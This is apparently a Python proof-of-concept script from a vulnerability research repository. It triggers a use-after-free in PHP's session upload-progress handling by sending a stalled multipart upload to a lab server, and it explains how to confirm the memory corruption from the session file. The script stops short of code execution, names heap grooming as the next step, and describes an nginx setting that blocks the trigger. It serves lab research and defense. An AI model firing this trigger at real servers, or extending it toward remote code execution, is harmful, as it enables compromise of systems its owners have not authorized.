#!/usr/bin/env python3
"""
CVE-2026-109618 research — stall-based arming of the session.upload_progress
UAF write-path (0x4148 methodology, https://0x4148.com — see
docs/ANALYSIS.md §0.3).

Mechanism (per the public writeup, verified here against our lab):
  1. Multipart POST with a session ID + PHP_SESSION_UPLOAD_PROGRESS field.
     nginx fastcgi_request_buffering=off forwards chunks as they arrive.
  2. First file-data burst: rfc1867 FILE_START/FILE_DATA events cache raw
     zval* pointers into the session HashTable (session.c ~3292/3318).
  3. Stall the upload longer than upload_progress.min_freq.
  4. Next FILE_DATA triggers update() -> php_session_rfc1867_update() ->
     php_session_initialize() re-reads/re-initializes the session data,
     freeing the old HashTable while the cached pointers still refer to it.
  5. Subsequent FILE_DATA writes (bytes_processed/done, session.c ~3331-3332)
     go THROUGH the stale pointers into freed memory.

Arming signature (observable in the session file):
  - file.start_time LATER than session start_time by ~stall seconds
    (the per-file entry was recreated during the re-init at burst 2)
  - file.bytes_processed RESET relative to true streamed bytes
    (counters restarted at the re-init; first burst's accounting lost)
  With session.upload_progress.cleanup=Off the file persists for reading.

  Under ZendMM the freed pages stay mapped, so the stale writes are
  silent: this ARMS the vulnerable path, it does not crash or execute.
  Turning that into RCE requires heap grooming (fake structures into
  ZendMM's 320-byte slab bin, build-specific offsets) — out of scope.

Usage:
  python3 verify_stall_arming.py --target http://127.0.0.1:18080 [--stall 2]
  then: docker exec php2shell-lab cat /tmp/sessions/sess_<sid>

For authorized security testing only.
"""
import argparse
import socket
import time
from urllib.parse import urlparse


def recv_response(sock, timeout=60):
    sock.settimeout(timeout)
    resp = b""
    while True:
        try:
            d = sock.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    return resp


def stall_upload(host, port, path, sid, stall, file_chunks=8, chunk=b"A" * 1024):
    """Send a multipart upload where the file data arrives in two bursts
    separated by `stall` seconds."""
    boundary = "STALLARM"
    head = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="stall_probe.bin"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\n"
    ).encode()

    first_burst = b"".join([chunk] * (file_chunks // 2))
    closing = b"\r\n--" + boundary.encode() + b"--\r\n"
    body_len = len(head) + len(first_burst) * 2 + len(closing)

    preamble = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {body_len}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()

    s = socket.create_connection((host, port), timeout=30)
    s.sendall(preamble + head + first_burst)
    # The stall: longer than upload_progress.min_freq (default 1s).
    time.sleep(stall)
    s.sendall(b"".join([chunk] * (file_chunks // 2)) + closing)
    resp = recv_response(s)
    s.close()
    return resp


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://127.0.0.1:18080")
    ap.add_argument("--stall", type=float, default=2.0,
                    help="seconds between file-data bursts (must exceed "
                         "session.upload_progress.min_freq, default 1s)")
    ap.add_argument("--sid", default="abcdef0123456789abcdef0123456789",
                    help="32 hex chars")
    args = ap.parse_args()

    u = urlparse(args.target)
    host, port = u.hostname, u.port or 80

    print("[*] CVE-2026-109618 research — stall-based UAF path arming")
    print(f"[*] Target: {args.target}  stall={args.stall}s")
    print()

    print(f"[1] Multipart upload, {args.stall}s stall between data bursts")
    resp = stall_upload(host, port, "/index.php", args.sid, args.stall)
    status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp else "<no response>"
    print(f"    Response: {status}")

    print()
    print("[*] Arming signature to check in the session file")
    print(f"    (docker exec <container> cat /tmp/sessions/sess_{args.sid}):")
    print("    - file.start_time ~ stall seconds LATER than session start_time")
    print("      (per-file entry recreated during the burst-2 re-init)")
    print("    - file.bytes_processed RESET vs streamed bytes")
    print("      (first burst's accounting lost in re-init)")
    print("    Both present => php_session_initialize() ran twice; the old")
    print("    HashTable was freed while cached zval* still pointed into it;")
    print("    burst-2 progress writes went through stale pointers. ARMED.")
    print()
    print("[*] Silent under ZendMM (freed pages stay mapped). Crash/RCE")
    print("    requires heap grooming into ZendMM's 320-byte slab bin —")
    print("    out of scope for this repo (see docs/ANALYSIS.md §0.3).")
    print()
    print("[*] Defense-in-depth check: with fastcgi_request_buffering ON")
    print("    (nginx default) the stall never reaches FPM — arming fails.")


if __name__ == "__main__":
    main()